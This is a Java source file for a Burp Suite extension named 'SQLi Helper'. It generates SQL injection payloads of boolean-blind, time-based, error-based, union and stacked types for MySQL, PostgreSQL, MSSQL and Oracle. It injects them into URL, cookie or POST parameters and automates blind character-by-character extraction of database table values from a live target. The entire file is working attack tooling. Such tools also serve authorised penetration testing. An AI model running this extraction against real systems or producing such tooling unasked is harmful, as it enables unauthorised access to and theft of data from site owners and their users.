package com.example.sqli;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.ui.UserInterface;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.InvocationType;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;

public class MontoyaExtension implements BurpExtension {
    private JPanel panel;
    private javax.swing.SwingWorker<String, String> iterWorker;
    private StringBuilder iterationOutput = new StringBuilder();
    private String baselineResponseBody = "";
    private HttpRequest baseRequest;
    private String finalIterationResult = "";

    @Override
    public void initialize(MontoyaApi montoyaApi) {
        montoyaApi.extension().setName("SQLi Helper");

        SwingUtilities.invokeLater(() -> {
            panel = new JPanel(new BorderLayout());
            JPanel input = new JPanel(new GridBagLayout());
            GridBagConstraints c = new GridBagConstraints();
            c.insets = new Insets(4,4,4,4);
            c.anchor = GridBagConstraints.WEST;
            int row = 0;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Table:"), c);
            c.gridx = 1; JTextField tableField = new JTextField(20); input.add(tableField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Column:"), c);
            c.gridx = 1; JTextField columnField = new JTextField(20); input.add(columnField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Injection type:"), c);
            c.gridx = 1; JComboBox<String> typeBox = new JComboBox<>(new String[]{"Boolean (blind)", "Time-based (sleep)", "Error-based", "Union-based", "Stacked/Multiple"});
            input.add(typeBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("DBMS:"), c);
            c.gridx = 1; JComboBox<String> dbmsBox = new JComboBox<>(new String[]{"MySQL", "PostgreSQL", "MSSQL", "Oracle", "Generic"});
            input.add(dbmsBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Row offset (LIMIT):"), c);
            c.gridx = 1; JTextField offsetField = new JTextField("0", 5); input.add(offsetField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Position (char index):"), c);
            c.gridx = 1; JTextField posField = new JTextField("1", 5); input.add(posField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Custom condition (optional):"), c);
            c.gridx = 1; JTextField condField = new JTextField(20); input.add(condField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Target URL:"), c);
            c.gridx = 1; JTextField urlField = new JTextField("http://target.com/page.php?id=1", 30); input.add(urlField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("HTTP Method:"), c);
            c.gridx = 1; JComboBox<String> methodBox = new JComboBox<>(new String[]{"GET", "POST"}); input.add(methodBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Injection source:"), c);
            c.gridx = 1; JComboBox<String> sourceBox = new JComboBox<>(new String[]{"URL parameter", "Cookie", "POST parameter"}); input.add(sourceBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Parameter name:"), c);
            c.gridx = 1; JTextField paramField = new JTextField("id", 15); input.add(paramField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Charset:"), c);
            c.gridx = 1; JTextField charsetField = new JTextField("abcdefghijklmnopqrstuvwxyz0123456789", 20); input.add(charsetField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Max position:"), c);
            c.gridx = 1; JTextField maxPosField = new JTextField("8", 5); input.add(maxPosField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Boolean success keywords:"), c);
            c.gridx = 1; JTextField booleanKeywordsField = new JTextField("Welcome back, logged in, successful login", 30); input.add(booleanKeywordsField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Delay ms between payloads:"), c);
            c.gridx = 1; JTextField delayField = new JTextField("500", 6); input.add(delayField, c);
            row++;

            c.gridx = 0; c.gridy = row; JButton startIter = new JButton("Start Iteration"); input.add(startIter, c);
            c.gridx = 1; JButton stopIter = new JButton("Stop"); input.add(stopIter, c);
            row++;

            c.gridx = 0; c.gridy = row; JButton genButton = new JButton("Generate"); input.add(genButton, c);
            c.gridx = 1; JButton testButton = new JButton("Test Payload"); input.add(testButton, c);
            row++;

            panel.add(input, BorderLayout.NORTH);

            JTextArea output = new JTextArea(10, 60);
            output.setLineWrap(true);
            output.setWrapStyleWord(true);
            panel.add(new JScrollPane(output), BorderLayout.CENTER);

            JPanel bottom = new JPanel(new BorderLayout());
            JButton copyBtn = new JButton("Copy");
            copyBtn.setEnabled(false);
            bottom.add(copyBtn, BorderLayout.SOUTH);
            panel.add(bottom, BorderLayout.SOUTH);

            genButton.addActionListener(e -> {
                String table = tableField.getText().trim();
                String column = columnField.getText().trim();
                String type = (String) typeBox.getSelectedItem();
                int offset = parseInt(offsetField.getText().trim(), 0);
                int pos = parseInt(posField.getText().trim(), 1);
                String cond = condField.getText().trim();
                if (table.isEmpty() || column.isEmpty()) {
                    JOptionPane.showMessageDialog(panel, "Table and column required");
                    return;
                }
                String dbms = (String) dbmsBox.getSelectedItem();
                String payload = generatePayload(table, column, type, offset, pos, cond, dbms, null);
                output.setText(payload);
            });

            startIter.addActionListener(e -> {
                if (iterWorker != null && !iterWorker.isDone()) {
                    JOptionPane.showMessageDialog(panel, "Iteration already running");
                    return;
                }

                String table = tableField.getText().trim();
                String column = columnField.getText().trim();
                if (table.isEmpty() || column.isEmpty()) {
                    JOptionPane.showMessageDialog(panel, "Table and column required");
                    return;
                }
                String type = (String) typeBox.getSelectedItem();
                String dbms = (String) dbmsBox.getSelectedItem();
                int offset = parseInt(offsetField.getText().trim(), 0);
                int maxPos = parseInt(maxPosField.getText().trim(), 8);
                String charset = charsetField.getText();
                String booleanKeywords = booleanKeywordsField.getText().trim();
                int delay = parseInt(delayField.getText().trim(), 500);
                String urlStr = urlField.getText().trim();
                String method = (String) methodBox.getSelectedItem();
                String paramName = paramField.getText().trim();
                String source = (String) sourceBox.getSelectedItem();

                iterationOutput.setLength(0);
                finalIterationResult = "";
                copyBtn.setEnabled(false);
                output.setText("Full SQLi payload: " + generatePayload(table, column, type, offset, 1, "", dbms, null));

                iterWorker = new javax.swing.SwingWorker<String, String>() {
                    private final StringBuilder extractedValue = new StringBuilder();

                    @Override
                    protected String doInBackground() throws Exception {
                        String baselineResponseBody = fetchResponseBody(urlStr, method, paramName, source, montoyaApi);
                        for (int p = 1; p <= maxPos && !isCancelled(); p++) {
                            boolean foundMatchForPosition = false;
                            for (int i = 0; i < charset.length() && !isCancelled(); i++) {
                                char ch = charset.charAt(i);
                                int ascii = (int) ch;
                                String payload = generatePayload(
                                    table,
                                    column,
                                    type,
                                    offset,
                                    p,
                                    "",
                                    dbms,
                                    Integer.valueOf(ascii)
                                );
                                publish("STATUS:Checking position " + p + " | trying character '" + ch + "' (ASCII " + ascii + ")");
                                HttpRequest injectedRequest = injectIntoOriginalRequest(baseRequest, paramName, source, payload);
                                HttpRequestResponse response = injectedRequest != null ? montoyaApi.http().sendRequest(injectedRequest) : null;
                                String responseBody = "";
                                if (response != null && response.response() != null) {
                                    responseBody = response.response().bodyToString();
                                }
                                String successKeyword = extractMatchedSuccessKeyword(responseBody, booleanKeywords);
                                boolean isMatch;
                                if (type != null && type.contains("Boolean")) {
                                    // For Boolean blind SQLi:
                                    // only the configured keyword decides TRUE/FALSE.
                                    isMatch = !successKeyword.isEmpty();
                                } else {
                                    // Other injection types can use different
                                    // matching logic later.
                                    isMatch = false;
                                }
                                if (isMatch) {
                                    extractedValue.append(ch);
                                    iterationOutput.setLength(0);
                                    iterationOutput.append(extractedValue);
                                    foundMatchForPosition = true;
                                    publish("STATUS:Match found at position " + p + " | character '" + ch + "' | current result: " + extractedValue);
                                    publish("RESULT:" + extractedValue.toString());
                                    break;
                                }
                                publish("STATUS:No match at position " + p + " for character '" + ch + "' (ASCII " + ascii + ")");
                                try {
                                    Thread.sleep(delay);
                                } catch (InterruptedException ex) {
                                    return extractedValue.toString();
                                }
                            }
                            if (!foundMatchForPosition) {
                                break;
                            }
                        }
                        return extractedValue.toString();
                    }

                    @Override
                    protected void process(java.util.List<String> chunks) {
                        for (String chunk : chunks) {
                            if (chunk.startsWith("STATUS:")) {
                                output.append(
                                    chunk.substring("STATUS:".length())
                                    + System.lineSeparator()
                                );
                                output.setCaretPosition(
                                    output.getDocument().getLength()
                                );
                            } else if (chunk.startsWith("RESULT:")) {
                                String value = chunk.substring("RESULT:".length());
                                output.append(
                                    "RESULT: " + value + System.lineSeparator()
                                );
                                output.setCaretPosition(
                                    output.getDocument().getLength()
                                );
                            }
                        }
                    }

                    @Override
                    protected void done() {
                        String finalResult = extractedValue.toString();
                        finalIterationResult = finalResult;
                        iterationOutput.setLength(0);
                        iterationOutput.append(finalResult);
                        output.append(
                            System.lineSeparator() +
                            "=== ITERATION FINISHED ===" + System.lineSeparator() +
                            "Final result: " + (finalResult.isEmpty() ? "No match found" : finalResult) + System.lineSeparator()
                        );
                        copyBtn.setEnabled(!finalResult.isEmpty());
                        JOptionPane.showMessageDialog(
                            panel,
                            "Iteration finished: "
                        );
                    }
                };
                iterWorker.execute();
            });

            stopIter.addActionListener(e -> {
                if (iterWorker != null && !iterWorker.isDone()) {
                    iterWorker.cancel(true);
                    JOptionPane.showMessageDialog(panel, "Stopping iteration...");
                }
            });

            copyBtn.addActionListener(e -> {
                if (finalIterationResult == null || finalIterationResult.isEmpty()) {
                    JOptionPane.showMessageDialog(panel, "Iteration must finish before copying the final result");
                    return;
                }
                StringSelection sel = new StringSelection(finalIterationResult);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
                JOptionPane.showMessageDialog(panel, "Copied final iteration result to clipboard");
            });

            testButton.addActionListener(e -> testPayload(output, urlField, methodBox, paramField, sourceBox, montoyaApi, panel));

            UserInterface ui = montoyaApi.userInterface();
            ContextMenuItemsProvider provider = new ContextMenuItemsProvider() {
                @Override
                public java.util.List<java.awt.Component> provideMenuItems(burp.api.montoya.ui.contextmenu.ContextMenuEvent event) {
                    if (!event.isFrom(InvocationType.MESSAGE_EDITOR_REQUEST)) {
                        return java.util.Collections.emptyList();
                    }
                    if (event.messageEditorRequestResponse().isEmpty()) {
                        return java.util.Collections.emptyList();
                    }
                    MessageEditorHttpRequestResponse editor = event.messageEditorRequestResponse().get();
                    HttpRequestResponse requestResponse = editor.requestResponse();
                    if (requestResponse == null || requestResponse.request() == null) {
                        return java.util.Collections.emptyList();
                    }

                    JMenuItem sendItem = new JMenuItem("Send to SQLi Helper");
                    sendItem.addActionListener(evt -> {
                        HttpRequest request = requestResponse.request();
                        baseRequest = request;
                        populateRequestIntoFields(request, urlField, methodBox, sourceBox, paramField);
                        if (panel != null) {
                            panel.setVisible(true);
                        }
                    });
                    return java.util.Collections.singletonList(sendItem);
                }
            };
            ui.registerContextMenuItemsProvider(provider);
            ui.registerSuiteTab("SQLi Helper", panel);
        });
    }

    private void populateRequestIntoFields(HttpRequest request, JTextField urlField, JComboBox<String> methodBox,
                                          JComboBox<String> sourceBox, JTextField paramField) {
        if (request == null) {
            return;
        }

        if (request.url() != null && !request.url().isEmpty()) {
            urlField.setText(request.url());
        }

        if (request.method() != null && !request.method().isEmpty()) {
            methodBox.setSelectedItem(request.method().toUpperCase(Locale.ROOT));
        }

        String selectedSource = "URL parameter";
        String selectedName = "id";
        if (request.parameters() != null && !request.parameters().isEmpty()) {
            for (burp.api.montoya.http.message.params.ParsedHttpParameter parameter : request.parameters()) {
                if (parameter.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                    selectedSource = "Cookie";
                    selectedName = parameter.name();
                    break;
                }
            }
            if ("URL parameter".equals(selectedSource)) {
                for (burp.api.montoya.http.message.params.ParsedHttpParameter parameter : request.parameters()) {
                    if (parameter.type() == burp.api.montoya.http.message.params.HttpParameterType.URL) {
                        selectedSource = "URL parameter";
                        selectedName = parameter.name();
                        break;
                    }
                }
            }
            if ("URL parameter".equals(selectedSource) && "id".equals(selectedName)) {
                for (burp.api.montoya.http.message.params.ParsedHttpParameter parameter : request.parameters()) {
                    if (parameter.type() == burp.api.montoya.http.message.params.HttpParameterType.BODY) {
                        selectedSource = "POST parameter";
                        selectedName = parameter.name();
                        break;
                    }
                }
            }
        }

        sourceBox.setSelectedItem(selectedSource);
        paramField.setText(selectedName);
    }

    private void testPayload(JTextArea output, JTextField urlField, JComboBox<String> methodBox, JTextField paramField,
                            JComboBox<String> sourceBox, MontoyaApi montoyaApi, JPanel panel) {
        String payload = output.getText();
        if (payload == null || payload.isEmpty()) {
            JOptionPane.showMessageDialog(panel, "No payload to test. Generate one first.");
            return;
        }

        String urlStr = urlField.getText().trim();
        String method = (String) methodBox.getSelectedItem();
        String paramName = paramField.getText().trim();
        String source = (String) sourceBox.getSelectedItem();

        if (urlStr.isEmpty() || paramName.isEmpty()) {
            JOptionPane.showMessageDialog(panel, "URL and parameter name required");
            return;
        }

        new SwingWorker<String, Void>() {
            @Override
            protected String doInBackground() {
                try {
                    URL url = new URL(urlStr);
                    String host = url.getHost();
                    int port = url.getPort();
                    boolean useHttps = "https".equalsIgnoreCase(url.getProtocol());
                    if (port < 0) {
                        port = useHttps ? 443 : 80;
                    }

                    HttpService service = HttpService.httpService(host, port, useHttps);
                    String requestText = buildRequestWithInjectedValue(url, method, paramName, source, payload);
                    HttpRequest request = HttpRequest.httpRequest(service, requestText);
                    HttpRequestResponse httpResponse = montoyaApi.http().sendRequest(request);

                    if (httpResponse != null && httpResponse.response() != null) {
                        return "=== Response ===\n" + httpResponse.response().toString();
                    }
                    return "No response received";
                } catch (Exception ex) {
                    return "Error testing payload: " + ex.getMessage();
                }
            }

            @Override
            protected void done() {
                try {
                    output.setText(get());
                } catch (Exception ex) {
                    JOptionPane.showMessageDialog(panel, "Error testing payload: " + ex.getMessage());
                    ex.printStackTrace();
                }
            }
        }.execute();
    }

    private HttpRequest injectIntoOriginalRequest(HttpRequest originalRequest, String parameterName, String source, String payload) {
        if (originalRequest == null) {
            return null;
        }

        HttpParameterType type;
        String normalized = normalizeSource(source);
        if ("cookie".equals(normalized)) {
            type = HttpParameterType.COOKIE;
        } else if ("post".equals(normalized)) {
            type = HttpParameterType.BODY;
        } else {
            type = HttpParameterType.URL;
        }

        String originalValue = originalRequest.parameterValue(parameterName, type);
        if (originalValue == null) {
            originalValue = "";
        }

        String injectedValue = originalValue + payload;

        HttpParameter newParameter;
        if (type == HttpParameterType.COOKIE) {
            newParameter = HttpParameter.cookieParameter(parameterName, injectedValue);
        } else if (type == HttpParameterType.BODY) {
            newParameter = HttpParameter.bodyParameter(parameterName, injectedValue);
        } else {
            newParameter = HttpParameter.urlParameter(parameterName, injectedValue);
        }

        return originalRequest.withParameter(newParameter);
    }

    private String buildRequestWithInjectedValue(URL url, String method, String paramName, String source, String payload) throws Exception {
        String requestMethod = method == null ? "GET" : method.toUpperCase(Locale.ROOT);
        String requestPath = url.getPath();
        if (requestPath == null || requestPath.isEmpty()) {
            requestPath = "/";
        }

        String query = url.getQuery() != null ? url.getQuery() : "";
        String host = url.getHost();
        String rawRequest = requestMethod + " " + requestPath + (query.isEmpty() ? "" : "?" + query) + " HTTP/1.1\r\nHost: " + host + "\r\n";

        if ("POST".equalsIgnoreCase(requestMethod)) {
            rawRequest += "Content-Type: application/x-www-form-urlencoded\r\n";
        }

        String sourceKey = normalizeSource(source);
        String mutated = injectPayloadIntoRequest(rawRequest + "\r\n", paramName, sourceKey, payload, true);
        if ("POST".equalsIgnoreCase(requestMethod) && "post".equals(sourceKey)) {
            String body = url.getQuery() != null && !url.getQuery().isEmpty() ? url.getQuery() : "";
            String requestBody = body.isEmpty() ? paramName + "=" + URLEncoder.encode(payload, StandardCharsets.UTF_8) : body;
            mutated = injectPayloadIntoRequest(mutated, paramName, "body", payload, true);
            if (!requestBody.equals(body)) {
                mutated = mutated.replace("\r\n\r\n", "\r\n\r\n" + requestBody);
            }
        }
        return mutated;
    }

    public String injectPayloadIntoRequest(String request, String parameterName, String source, String payload, boolean encodePayload) {
        if (request == null || request.isEmpty()) {
            return request;
        }
        String sourceKey = normalizeSource(source);
        String[] parts = request.split("\\r\\n\\r\\n", 2);
        String headers = parts[0];
        String body = parts.length > 1 ? parts[1] : "";

        if ("cookie".equals(sourceKey)) {
            String updatedHeader = replaceOrAppendCookie(headers, parameterName, payload, encodePayload);
            return updatedHeader + (parts.length > 1 ? "\r\n\r\n" + body : "");
        }

        if ("body".equals(sourceKey) || "post".equals(sourceKey)) {
            String encoded = encodePayload ? URLEncoder.encode(payload, StandardCharsets.UTF_8) : payload;
            String newBody = replaceOrAppendFormParameter(body, parameterName, encoded);
            return headers + "\r\n\r\n" + newBody;
        }

        String updatedRequestLine = replaceOrAppendQueryValue(headers, parameterName, payload, encodePayload);
        return updatedRequestLine + (parts.length > 1 ? "\r\n\r\n" + body : "");
    }

    private String replaceOrAppendCookie(String headers, String parameterName, String payload, boolean encodePayload) {
        String[] lines = headers.split("\\r\\n");
        StringBuilder result = new StringBuilder();
        boolean replaced = false;
        for (String line : lines) {
            if (line.regionMatches(true, 0, "Cookie:", 0, 7)) {
                String cookieHeader = line.substring(7).trim();
                List<String> segments = new ArrayList<>(Arrays.asList(cookieHeader.split("; ")));
                boolean found = false;
                StringBuilder rebuilt = new StringBuilder();
                for (String segment : segments) {
                    if (segment.trim().isEmpty()) {
                        continue;
                    }
                    int equals = segment.indexOf('=');
                    if (equals > 0) {
                        String name = segment.substring(0, equals).trim();
                        String value = segment.substring(equals + 1).trim();
                        if (name.equalsIgnoreCase(parameterName)) {
                            rebuilt.append(name).append('=').append(value).append(payload).append("; ");
                            found = true;
                        } else {
                            rebuilt.append(segment).append("; ");
                        }
                    } else {
                        rebuilt.append(segment).append("; ");
                    }
                }
                if (!found) {
                    rebuilt.append(parameterName).append('=').append(payload).append("; ");
                }
                String finalCookie = rebuilt.toString();
                if (finalCookie.endsWith("; ")) {
                    finalCookie = finalCookie.substring(0, finalCookie.length() - 2);
                }
                result.append("Cookie: ").append(finalCookie);
                replaced = true;
            } else {
                result.append(line);
            }
            result.append("\r\n");
        }
        if (!replaced) {
            result.append("Cookie: ").append(parameterName).append("=").append(payload).append("\r\n");
        }
        return result.toString().trim();
    }

    private String replaceOrAppendQueryValue(String headerText, String parameterName, String payload, boolean encodePayload) {
        String[] lines = headerText.split("\\r\\n");
        String requestLine = lines[0];
        String[] requestParts = requestLine.split(" ", 3);
        if (requestParts.length < 3) {
            return headerText;
        }
        String method = requestParts[0];
        String target = requestParts[1];
        String version = requestParts[2];

        String path = target;
        String query = "";
        int qm = target.indexOf('?');
        if (qm >= 0) {
            path = target.substring(0, qm);
            query = target.substring(qm + 1);
        }

        String newQuery = replaceOrAppendFormParameter(query, parameterName, encodePayload ? URLEncoder.encode(payload, StandardCharsets.UTF_8) : payload);
        String newTarget = path + (newQuery.isEmpty() ? "" : "?" + newQuery);
        StringBuilder rebuilt = new StringBuilder();
        rebuilt.append(method).append(" ").append(newTarget).append(" ").append(version);
        for (int i = 1; i < lines.length; i++) {
            rebuilt.append("\r\n").append(lines[i]);
        }
        return rebuilt.toString();
    }

    private String replaceOrAppendFormParameter(String parameterString, String parameterName, String parameterValue) {
        if (parameterString == null || parameterString.isEmpty()) {
            return parameterName + "=" + parameterValue;
        }
        List<String> segments = new ArrayList<>(Arrays.asList(parameterString.split("&")));
        boolean replaced = false;
        StringBuilder rebuilt = new StringBuilder();
        for (String segment : segments) {
            if (segment == null || segment.isEmpty()) {
                continue;
            }
            int eq = segment.indexOf('=');
            String name = eq >= 0 ? segment.substring(0, eq) : segment;
            if (name.equalsIgnoreCase(parameterName)) {
                rebuilt.append(parameterName).append('=').append(parameterValue);
                replaced = true;
            } else {
                rebuilt.append(segment);
            }
            rebuilt.append('&');
        }
        if (!replaced) {
            if (rebuilt.length() > 0) {
                rebuilt.append(parameterName).append('=').append(parameterValue);
            } else {
                rebuilt.append(parameterName).append('=').append(parameterValue);
            }
        }
        String result = rebuilt.toString();
        if (result.endsWith("&")) {
            result = result.substring(0, result.length() - 1);
        }
        return result;
    }

    private String normalizeSource(String source) {
        if (source == null) {
            return "url";
        }
        String normalized = source.trim().toLowerCase(Locale.ROOT);
        if (normalized.contains("cookie")) {
            return "cookie";
        }
        if (normalized.contains("post") || normalized.contains("body")) {
            return "post";
        }
        return "url";
    }

    @FunctionalInterface
    interface CharacterMatchTester {
        boolean matches(char candidate, int position);
    }

    static String iterateMatchedCharacters(String charset, int maxPositions, CharacterMatchTester tester) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxPositions; pos++) {
            boolean matched = false;
            for (int i = 0; i < charset.length(); i++) {
                char ch = charset.charAt(i);
                if (tester.matches(ch, pos)) {
                    result.append(ch);
                    matched = true;
                    break;
                }
            }
            if (!matched) {
                break;
            }
        }
        return result.toString();
    }

    static void recordIterationResult(StringBuilder resultBuffer, char ch, boolean matched) {
        if (matched) {
            resultBuffer.append(ch);
        }
    }

    private String fetchResponseBody(String urlStr, String method, String paramName, String source, MontoyaApi montoyaApi) {
        if (urlStr == null || urlStr.isEmpty() || montoyaApi == null) {
            return "";
        }
        if (baseRequest != null && paramName != null && !paramName.isEmpty()) {
            HttpRequest injectedRequest = injectIntoOriginalRequest(baseRequest, paramName, source, "");
            if (injectedRequest != null) {
                HttpRequestResponse response = montoyaApi.http().sendRequest(injectedRequest);
                return response != null && response.response() != null ? response.response().bodyToString() : "";
            }
        }
        try {
            URL url = new URL(urlStr);
            HttpService service = HttpService.httpService(
                    url.getHost(),
                    url.getPort() >= 0 ? url.getPort() : ("https".equalsIgnoreCase(url.getProtocol()) ? 443 : 80),
                    "https".equalsIgnoreCase(url.getProtocol())
            );
            String requestText = buildRequestWithInjectedValue(url, method, paramName, source, "");
            HttpRequest request = HttpRequest.httpRequest(service, requestText);
            HttpRequestResponse response = montoyaApi.http().sendRequest(request);
            return response != null && response.response() != null ? response.response().bodyToString() : "";
        } catch (Exception ex) {
            return "";
        }
    }

    private String fetchResponseBody(String urlStr, String method, String paramName, String source, String payload, MontoyaApi montoyaApi) {
        if (urlStr == null || urlStr.isEmpty() || montoyaApi == null) {
            return "";
        }
        if (baseRequest != null && paramName != null && !paramName.isEmpty()) {
            HttpRequest injectedRequest = injectIntoOriginalRequest(baseRequest, paramName, source, payload);
            if (injectedRequest != null) {
                HttpRequestResponse response = montoyaApi.http().sendRequest(injectedRequest);
                return response != null && response.response() != null ? response.response().bodyToString() : "";
            }
        }
        try {
            URL url = new URL(urlStr);
            HttpService service = HttpService.httpService(
                    url.getHost(),
                    url.getPort() >= 0 ? url.getPort() : ("https".equalsIgnoreCase(url.getProtocol()) ? 443 : 80),
                    "https".equalsIgnoreCase(url.getProtocol())
            );
            String requestText = buildRequestWithInjectedValue(url, method, paramName, source, payload);
            HttpRequest request = HttpRequest.httpRequest(service, requestText);
            HttpRequestResponse response = montoyaApi.http().sendRequest(request);
            return response != null && response.response() != null ? response.response().bodyToString() : "";
        } catch (Exception ex) {
            return "";
        }
    }

    private boolean hasSuccessfulResponse(String urlStr, String method, String paramName, String source, String payload, MontoyaApi montoyaApi, String baselineResponseBody) {
        return hasSuccessfulResponse(urlStr, method, paramName, source, payload, montoyaApi, baselineResponseBody, "Welcome back, logged in, successful login");
    }

    private boolean hasSuccessfulResponse(String urlStr, String method, String paramName, String source, String payload, MontoyaApi montoyaApi,
                                         String baselineResponseBody, String successKeywords) {
        if (urlStr == null || urlStr.isEmpty() || montoyaApi == null || baselineResponseBody == null) {
            return false;
        }
        String responseBody = fetchResponseBody(urlStr, method, paramName, source, payload, montoyaApi);
        return hasSuccessfulResponseBody(responseBody, baselineResponseBody, successKeywords);
    }

    private boolean hasSuccessfulResponseBody(String responseBody, String baselineResponseBody, String successKeywords) {
        if (responseBody == null || responseBody.isEmpty() || baselineResponseBody == null || baselineResponseBody.isEmpty()) {
            return false;
        }

        if (matchesBooleanSuccessKeywords(responseBody, successKeywords)) {
            return true;
        }

        return !responseBody.equalsIgnoreCase(baselineResponseBody)
                && (responseBody.length() != baselineResponseBody.length() || !responseBody.equals(baselineResponseBody));
    }

    static boolean isPositiveSuccessResponse(String responseBody) {
        return matchesBooleanSuccessKeywords(responseBody, "Welcome back, logged in, successful login");
    }

    static boolean matchesBooleanSuccessKeywords(String responseBody, String keywordsText) {
        return !extractMatchedSuccessKeyword(responseBody, keywordsText).isEmpty();
    }

    static String extractMatchedSuccessKeyword(String responseBody, String keywordsText) {
        if (responseBody == null || keywordsText == null || keywordsText.trim().isEmpty()) {
            return "";
        }
        String lowerResponse = responseBody.toLowerCase(Locale.ROOT);
        String[] keywords = keywordsText.split(",");
        for (String keyword : keywords) {
            String cleaned = keyword.trim();
            if (cleaned.isEmpty()) {
                continue;
            }
            if (lowerResponse.contains(cleaned.toLowerCase(Locale.ROOT))) {
                return cleaned;
            }
        }
        return "";
    }

    private int parseInt(String s, int def) {
        try {
            return Integer.parseInt(s);
        } catch (Exception e) {
            return def;
        }
    }

    private String generatePayload(String table, String column, String type, int offset, int pos, String cond, String dbms, Integer asciiOverride) {
        String baseSelect;
        if ("PostgreSQL".equalsIgnoreCase(dbms)) {
            baseSelect = String.format("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", column, table, offset);
        } else if ("MSSQL".equalsIgnoreCase(dbms)) {
            baseSelect = String.format("(SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", column, table, offset);
        } else if ("Oracle".equalsIgnoreCase(dbms)) {
            int row = offset + 1;
            baseSelect = String.format("(SELECT %s FROM (SELECT %s, ROWNUM rnum FROM %s WHERE ROWNUM <= %d) WHERE rnum = %d)", column, column, table, row, row);
        } else {
            baseSelect = String.format("(SELECT %s FROM %s LIMIT %d,1)", column, table, offset);
        }

        String condExp;
        if (asciiOverride != null) {
            condExp = String.format("ASCII(SUBSTR(%s,%d,1))=%d", baseSelect, pos, asciiOverride.intValue());
        } else if (cond != null && !cond.isEmpty()) {
            condExp = cond;
        } else {
            condExp = String.format("ASCII(SUBSTR(%s,%d,1))=%d", baseSelect, pos, (int) 'a');
        }

        String sleepExpr;
        if ("PostgreSQL".equalsIgnoreCase(dbms)) {
            sleepExpr = "pg_sleep(5)";
        } else if ("MSSQL".equalsIgnoreCase(dbms)) {
            sleepExpr = "WAITFOR DELAY '0:0:5'";
        } else if ("Oracle".equalsIgnoreCase(dbms)) {
            sleepExpr = "dbms_lock.sleep(5)";
        } else {
            sleepExpr = "SLEEP(5)";
        }

        if (type != null && type.contains("Time")) {
            if ("MSSQL".equalsIgnoreCase(dbms) || "Oracle".equalsIgnoreCase(dbms)) {
                return String.format("' OR (CASE WHEN (%s) THEN %s ELSE 0 END)-- ", condExp, sleepExpr);
            }
            return String.format("' OR IF(%s, %s, 0)-- ", condExp, sleepExpr);
        } else if (type != null && type.contains("Error")) {
            if ("MySQL".equalsIgnoreCase(dbms) || "Generic".equalsIgnoreCase(dbms)) {
                return String.format("' AND updatexml(1,concat(0x3a,(%s)),1)-- ", baseSelect);
            } else if ("PostgreSQL".equalsIgnoreCase(dbms)) {
                return String.format("' OR (SELECT CASE WHEN (%s) THEN to_char(1/0) ELSE NULL END)-- ", condExp);
            } else if ("Oracle".equalsIgnoreCase(dbms)) {
                return String.format("' AND to_number((%s))=1-- ", baseSelect);
            } else {
                return "-- Error-based template: adapt for your DBMS --" + System.lineSeparator() + String.format("(value) FROM %s", table);
            }
        } else if (type != null && type.contains("Union")) {
            if ("PostgreSQL".equalsIgnoreCase(dbms)) {
                return String.format("' UNION SELECT <col1>, %s, <colN> FROM %s LIMIT 1 OFFSET %d-- ", baseSelect, table, offset);
            }
            return String.format("' UNION SELECT <col1>, %s, <colN> FROM %s LIMIT %d,1-- ", baseSelect, table, offset);
        } else if (type != null && type.contains("Stacked")) {
            if ("MSSQL".equalsIgnoreCase(dbms)) {
                return String.format("'; %s; -- ", String.format("SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", column, table, offset));
            } else if ("Oracle".equalsIgnoreCase(dbms)) {
                return String.format("'; %s; -- ", String.format("SELECT %s FROM %s WHERE ROWNUM = 1 AND ROWNUM <= %d", column, table, offset + 1));
            }
            return String.format("'; SELECT %s FROM %s LIMIT %d,1; -- ", column, table, offset);
        } else {
            return String.format("' OR (CASE WHEN (%s) THEN 1 ELSE 0 END)=1-- ", condExp);
        }
    }
}
